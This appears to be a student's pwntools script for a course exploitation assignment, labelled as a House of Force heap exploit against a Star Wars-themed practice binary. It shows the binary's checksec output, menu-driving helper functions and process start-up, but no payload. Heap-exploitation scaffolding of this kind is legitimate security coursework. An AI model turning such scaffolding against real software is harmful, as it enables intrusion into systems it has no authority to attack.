'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP22: Clone Wars
File Description:  House of Force on a Starwars Binary

Checksec info:
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83) Symbols       No    0               4               CloneWarS

File info:
CloneWarS: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a45e46d5347deb6022d64604638a3ed70e8de417, not stripped
'''

# Import Libraries
from pwn import *
filename = "./CloneWarS"
elf = ELF(filename)
context.arch = 'amd64'

# Setting up helper functions for each
def buildDeathStar(size):
    p.sendlineafter(b"Your choiec: ", '1')
    p.sendlineafter(b"Assemble death star: ",str(size))

def r2d2(num):
    p.sendlineafter(b"Your choiec: ", '2')
    p.sendlineafter(b"R2?: ",str(num))

def starships(size,kind,capacity):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Master, the amount of starships: ', str(size))
    p.sendlineafter('What kind of starships?: ', kind)
    p.sendlineafter('Capacity of troopers in the starships: ', str(capacity))

def lightsabers(nLs, color):
    p.sendlineafter('Your choice: ', '5')
    p.sendafter('How many lightsabers do you think you will need?: ', '\n')
    p.sendline(str(nLs))
    p.sendafter('What color would you like on your light sabers: ', color)

def exit():
    p.sendlineafter('Your choice: ', '7')
    
# Start a process with correct library
p=process(filename, env = {'LD_LIBRARY_PATH' : '.'})
print(p.recv())
